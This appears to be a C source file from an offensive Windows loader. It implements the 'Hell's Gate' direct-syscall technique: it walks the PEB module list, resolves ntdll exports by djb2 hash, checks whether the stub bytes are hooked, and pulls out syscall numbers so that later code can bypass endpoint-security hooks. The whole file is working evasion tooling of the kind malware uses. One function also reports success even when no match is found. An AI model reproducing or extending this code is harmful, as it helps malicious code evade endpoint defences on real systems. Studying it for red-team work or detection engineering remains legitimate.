#include <Windows.h>
#include <winternl.h>

#include "utils.h"
#include "crt.h"
#include "encryption.h"


//implementation of GetPEBAddress
PPEB GetPEBAddress()
{
	return (PPEB)__readgsqword(0x60);
}

//implementation of GetLdrAddress
PPEB_LDR_DATA GetLdrAddress(PPEB peb)
{
	PPEB_LDR_DATA ldr_data_ptr = peb->Ldr;
	return ldr_data_ptr;
}

//implementation of GetModuleList
PLIST_ENTRY GetModuleList(PPEB_LDR_DATA ldr_ptr)
{
	PLIST_ENTRY list_ptr = &ldr_ptr->InMemoryOrderModuleList;
	return list_ptr;
}

//implementation of GetModuleBaseAddr
DWORD_PTR GetModuleBaseAddr(wchar_t target_dll[], PLIST_ENTRY head_node)
{
	DWORD_PTR module_addr = 0;
	PLIST_ENTRY temp = head_node->Flink;
	while (temp != head_node)
	{
		PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(temp, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (WCSNCMPA(target_dll, entry->FullDllName.Buffer, wcslen(target_dll)) == 0) {
			module_addr = (DWORD_PTR)entry->DllBase;
			break;  // Exit loop if the module is found
		}
		temp = temp->Flink;
	}

	return module_addr;
}

//implementation of GetNTHeader
PIMAGE_NT_HEADERS GetNTHeader(PBYTE pBase, PIMAGE_DOS_HEADER pDosHeader)
{
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);
	return pNtHeader;
}

//implementation of GetImgExportDir
PIMAGE_EXPORT_DIRECTORY GetImgExportDir(PBYTE pBase, PIMAGE_NT_HEADERS pNtHeader)
{
	IMAGE_OPTIONAL_HEADER OptionalHeader = pNtHeader->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	
	return pImgExportDir;
}

//implementation of GetVxTableEntry
BOOL GetVxTableEntry(PBYTE pBase, PIMAGE_EXPORT_DIRECTORY pExportDir, PVX_TABLE_ENTRY pVxTableEntry)
{
	PDWORD pFunctionNameArr;
	PWORD pFunctionOrdinalArr;
	PDWORD pFunctionAddressArr;

	pFunctionNameArr = (PDWORD)(pBase + pExportDir->AddressOfNames);
	pFunctionOrdinalArr = (PWORD)(pBase + pExportDir->AddressOfNameOrdinals);
	pFunctionAddressArr = (PDWORD)(pBase + pExportDir->AddressOfFunctions);

	PRINTA("[+] Searching for function hash\n");
	for (WORD i = 0; i < pExportDir->NumberOfNames; i++)
	{
		PCHAR pFunctionName = (PCHAR)(pBase + pFunctionNameArr[i]);
		PVOID pFunctionAddr = (PVOID)(pBase + pFunctionAddressArr[pFunctionOrdinalArr[i]]);

		if (djb2(pFunctionName) == pVxTableEntry->dwHash)
		{
			WORD idx = 0;
			PRINTA("\t[*] Hash for %s found extracting SSN\n", pFunctionName);
			PRINTA("\t[*] Function %s at address %p\n", pFunctionName, pFunctionAddr);
			//extract the syscall SSN
			pVxTableEntry->pAddress = pFunctionAddr;
			if (*((PBYTE)pFunctionAddr + idx) == 0x4c 
				&& *((PBYTE)pFunctionAddr + 1 + idx) == 0x8b
				&& *((PBYTE)pFunctionAddr + 2 + idx) == 0xd1
				&& *((PBYTE)pFunctionAddr + 3 + idx) == 0xb8
				) 
			{
				PRINTA("\t[*] No hooks detected\n");
				BYTE high = *((PBYTE)pFunctionAddr + 5 + idx);
				BYTE low = *((PBYTE)pFunctionAddr + 4 + idx);
				pVxTableEntry->wSystemCall = (high << 8 | low);
				PRINTA("\t[*] SSN for %s is %x\n", pFunctionName, pVxTableEntry->wSystemCall);
				break;
			}
		}
	}
	return TRUE;
}

//implementation of VxMoveMemory
PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}


